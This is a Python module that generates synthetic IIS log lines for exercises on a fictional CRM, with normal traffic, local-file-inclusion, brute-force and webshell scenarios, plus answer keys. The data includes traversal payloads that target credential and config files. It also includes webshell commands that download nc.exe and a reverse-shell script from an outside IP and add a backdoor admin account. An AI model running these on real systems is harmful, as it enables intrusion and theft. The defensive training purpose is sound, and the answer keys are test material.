"""IIS W3C Extended Log generators — noise and attack scenarios for NovaCRM."""
import random
from datetime import datetime
from .config import (LEGIT_IPS, IIS_SERVER_IP, IIS_HEADER, IIS_NORMAL_PATHS,
                     IIS_USER_AGENTS, IIS_ATTACKER_AGENTS,
                     pick, pick_n, rand_between, get_attacker_ips, format_iis_log_line)


def get_iis_header(start_time):
    return IIS_HEADER.format(date=start_time.strftime('%Y-%m-%d %H:%M:%S'))


def get_iis_lfi_payloads(difficulty):
    basic = [
        ('..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 200),
        ('..\\..\\..\\windows\\system32\\drivers\\etc\\networks', 200),
        ('..\\..\\..\\windows\\win.ini', 200),
        ('..\\..\\..\\windows\\system.ini', 200),
        ('..\\..\\..\\inetpub\\wwwroot\\web.config', 200),
        ('..\\..\\..\\inetpub\\wwwroot\\NovaCRM\\web.config', 200),
        ('..%5c..%5c..%5cwindows%5cwin.ini', 200),
        ('..%5c..%5c..%5cinetpub%5cwwwroot%5cweb.config', 200),
        ('....\\\\....\\\\....\\\\windows\\\\win.ini', 200),
        ('..%252f..%252f..%252fwindows%252fwin.ini', 200),
        ('C:\\windows\\system32\\drivers\\etc\\hosts', 200),
        ('C:\\inetpub\\wwwroot\\web.config', 200),
        ('C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex260115.log', 200),
    ]
    intermediate = [
        ('..\\..\\..\\windows\\system32\\config\\SAM', 403),
        ('..\\..\\..\\windows\\system32\\config\\SYSTEM', 403),
        ('..\\..\\..\\windows\\repair\\SAM', 200),
        ('..\\..\\..\\xampp\\passwords.txt', 200),
        ('..\\..\\..\\Program+Files\\Microsoft+SQL+Server\\MSSQL16.MSSQLSERVER\\MSSQL\\DATA\\master.mdf', 200),
        ('..\\..\\..\\Users\\Administrator\\.ssh\\id_rsa', 200),
        ('..\\..\\..\\Users\\Administrator\\Desktop\\passwords.txt', 200),
        ('..%255c..%255c..%255cwindows%255cwin.ini', 200),
        ('..%c0%af..%c0%af..%c0%afwindows\\win.ini', 200),
        ('..\\..\\..\\inetpub\\wwwroot\\NovaCRM\\App_Data\\NovaCRM.mdf', 200),
    ]
    advanced = [
        ('..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config', 200),
        ('..\\..\\..\\windows\\system32\\inetsrv\\config\\administration.config', 200),
        ('..\\..\\..\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config', 200),
        ('..\\..\\..\\windows\\debug\\NetSetup.LOG', 200),
        ('..\\..\\..\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys', 200),
        ('..\\..\\..\\Users\\All+Users\\Microsoft\\Windows\\Start+Menu\\Programs\\Startup', 200),
        ('..\\..\\..\\windows\\system32\\LogFiles\\httperr\\httperr1.log', 200),
    ]
    if difficulty == 'easy':
        return basic
    elif difficulty == 'hard':
        return basic + intermediate + advanced
    return basic + intermediate


def generate_iis_noise(count, start_time, end_time):
    lines = []
    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    generated = 0
    session_count = max(1, count // 8)

    for _ in range(session_count):
        if generated >= count:
            break
        session_ip = pick(LEGIT_IPS)
        session_ua = pick(IIS_USER_AGENTS)
        session_start = random.randint(start_ts, max(start_ts, end_ts - 300))
        current_ts = session_start
        requests_in_session = random.randint(3, 12)

        for _ in range(requests_in_session):
            if generated >= count:
                break
            path_entry = pick(IIS_NORMAL_PATHS)
            method, uri_stem, uri_query, status = path_entry
            time_taken = random.randint(15, 3000)
            ts = datetime.fromtimestamp(current_ts)

            lines.append({
                'timestamp': ts,
                'line': format_iis_log_line(ts, IIS_SERVER_IP, method, uri_stem, uri_query,
                                            80, '-', session_ip, session_ua, '-',
                                            status, 0, 0, time_taken),
            })
            current_ts += random.randint(1, 30)
            generated += 1

    return lines


def generate_iis_lfi(attacker_count, difficulty, start_time, end_time, overrides=None):
    lines = []
    answers = {
        'type': 'LFI (Local File Inclusion)',
        'vector': '/Content/Page?view=',
        'attacker_ips': [],
        'targeted_files': [],
    }

    attacker_ips = get_attacker_ips(overrides, attacker_count)
    payloads = get_iis_lfi_payloads(difficulty)
    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    answers['attacker_ips'] = attacker_ips

    for ip in attacker_ips:
        ua = pick(IIS_ATTACKER_AGENTS)
        attack_start = random.randint(start_ts, int(start_ts + (end_ts - start_ts) * 0.5))
        current_ts = attack_start

        selected = list(payloads)
        random.shuffle(selected)
        counts = {'easy': (6, 12), 'medium': (12, 20), 'hard': (18, len(selected))}
        lo, hi = counts.get(difficulty, (12, 20))
        selected = selected[:random.randint(lo, min(hi, len(selected)))]

        for payload, status in selected:
            uri_query = f'view={payload}'
            if payload not in answers['targeted_files']:
                answers['targeted_files'].append(payload)
            ts = datetime.fromtimestamp(current_ts)

            lines.append({
                'timestamp': ts,
                'line': format_iis_log_line(ts, IIS_SERVER_IP, 'GET', '/Content/Page', uri_query,
                                            80, '-', ip, ua, '-',
                                            status, 0, 0, random.randint(15, 500)),
            })
            current_ts += random.randint(1, 8)

    return {'lines': lines, 'answers': answers}


def generate_iis_bruteforce(attacker_count, difficulty, start_time, end_time, overrides=None):
    lines = []
    answers = {
        'type': 'HTTP Bruteforce',
        'target': '/Account/Login',
        'attacker_ips': [],
        'total_attempts_per_ip': {},
        'success': [],
    }

    attacker_ips = get_attacker_ips(overrides, attacker_count)
    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    answers['attacker_ips'] = attacker_ips

    attempt_ranges = {'easy': (50, 120), 'medium': (30, 80), 'hard': (15, 40)}
    delay_ranges = {'easy': (1, 2), 'medium': (2, 8), 'hard': (5, 25)}
    att_lo, att_hi = attempt_ranges.get(difficulty, (30, 80))
    del_lo, del_hi = delay_ranges.get(difficulty, (2, 8))

    for ip in attacker_ips:
        ua = pick(IIS_ATTACKER_AGENTS)
        attempts = random.randint(att_lo, att_hi)
        answers['total_attempts_per_ip'][ip] = attempts
        attack_start = random.randint(start_ts, start_ts + int((end_ts - start_ts) * 0.6))
        current_ts = attack_start
        success_attempt = random.randint(int(attempts * 0.7), attempts - 1)

        for a in range(attempts):
            is_success = (a == success_attempt)
            status = 302 if is_success else 200
            ts = datetime.fromtimestamp(current_ts)

            lines.append({
                'timestamp': ts,
                'line': format_iis_log_line(ts, IIS_SERVER_IP, 'POST', '/Account/Login', '-',
                                            80, '-', ip, ua, '/Account/Login',
                                            status, 0, 0, random.randint(100, 2000)),
            })

            if is_success:
                answers['success'].append({'ip': ip, 'attempt_number': a + 1})
            current_ts += random.randint(del_lo, del_hi)

    for _ in range(random.randint(2, 5)):
        legit_ip = pick(LEGIT_IPS)
        legit_ua = pick(IIS_USER_AGENTS)
        legit_time = random.randint(start_ts, end_ts - 30)

        for _ in range(random.randint(1, 2)):
            ts = datetime.fromtimestamp(legit_time)
            lines.append({
                'timestamp': ts,
                'line': format_iis_log_line(ts, IIS_SERVER_IP, 'POST', '/Account/Login', '-',
                                            80, '-', legit_ip, legit_ua, '/Account/Login',
                                            200, 0, 0, random.randint(200, 1500)),
            })
            legit_time += random.randint(10, 25)

        ts = datetime.fromtimestamp(legit_time)
        lines.append({
            'timestamp': ts,
            'line': format_iis_log_line(ts, IIS_SERVER_IP, 'POST', '/Account/Login', '-',
                                        80, '-', legit_ip, legit_ua, '/Account/Login',
                                        302, 0, 0, random.randint(100, 500)),
        })

    return {'lines': lines, 'answers': answers}


def generate_iis_webshell(attacker_count, difficulty, start_time, end_time, overrides=None):
    lines = []
    answers = {
        'type': 'Webshell',
        'shell_paths': ['/Uploads/Products/cache-handler.ashx'],
        'attacker_ips': [],
        'commands_executed': [],
    }

    attacker_ips = get_attacker_ips(overrides, attacker_count)
    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    answers['attacker_ips'] = attacker_ips

    cmds = [
        ('whoami', 'whoami'),
        ('hostname', 'hostname'),
        ('ipconfig /all', 'ipconfig+/all'),
        ('systeminfo', 'systeminfo'),
        ('net user', 'net+user'),
        ('net localgroup administrators', 'net+localgroup+administrators'),
        ('netstat -ano', 'netstat+-ano'),
        ('tasklist', 'tasklist'),
        ('dir C:\\inetpub\\wwwroot', 'dir+C%3A%5Cinetpub%5Cwwwroot'),
        ('type C:\\inetpub\\wwwroot\\NovaCRM\\web.config',
         'type+C%3A%5Cinetpub%5Cwwwroot%5CNovaCRM%5Cweb.config'),
        ('reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
         'reg+query+HKLM%5CSOFTWARE%5CMicrosoft%5CWindows%5CCurrentVersion%5CRun'),
        ('certutil -urlcache -split -f http://185.156.73.54/nc.exe C:\\Windows\\Temp\\nc.exe',
         'certutil+-urlcache+-split+-f+http%3A%2F%2F185.156.73.54%2Fnc.exe+C%3A%5CWindows%5CTemp%5Cnc.exe'),
        ('net user hacker P@ssw0rd123 /add', 'net+user+hacker+P%40ssw0rd123+%2Fadd'),
        ('net localgroup administrators hacker /add',
         'net+localgroup+administrators+hacker+%2Fadd'),
        ("powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.156.73.54/rev.ps1')\"",
         'powershell+-ep+bypass+-c+%22IEX(New-Object+Net.WebClient).DownloadString(%27http%3A%2F%2F185.156.73.54%2Frev.ps1%27)%22'),
    ]

    counts = {'easy': (5, 8), 'medium': (8, 12), 'hard': (len(cmds), len(cmds))}
    lo, hi = counts.get(difficulty, (8, 12))
    cmd_count = random.randint(lo, min(hi, len(cmds)))

    for ip in attacker_ips:
        ua = pick(IIS_ATTACKER_AGENTS)
        attack_start = random.randint(
            start_ts + int((end_ts - start_ts) * 0.3),
            start_ts + int((end_ts - start_ts) * 0.6)
        )
        current_ts = attack_start

        for cmd_raw, cmd_enc in cmds[:cmd_count]:
            answers['commands_executed'].append(cmd_raw)
            ts = datetime.fromtimestamp(current_ts)
            lines.append({
                'timestamp': ts,
                'line': format_iis_log_line(ts, IIS_SERVER_IP, 'GET',
                                            '/Uploads/Products/cache-handler.ashx', f'c={cmd_enc}',
                                            80, '-', ip, ua, '-',
                                            200, 0, 0, random.randint(50, 5000)),
            })
            current_ts += random.randint(1, 5) if random.randint(1, 4) == 1 else random.randint(8, 45)

    answers['commands_executed'] = list(dict.fromkeys(answers['commands_executed']))
    return {'lines': lines, 'answers': answers}
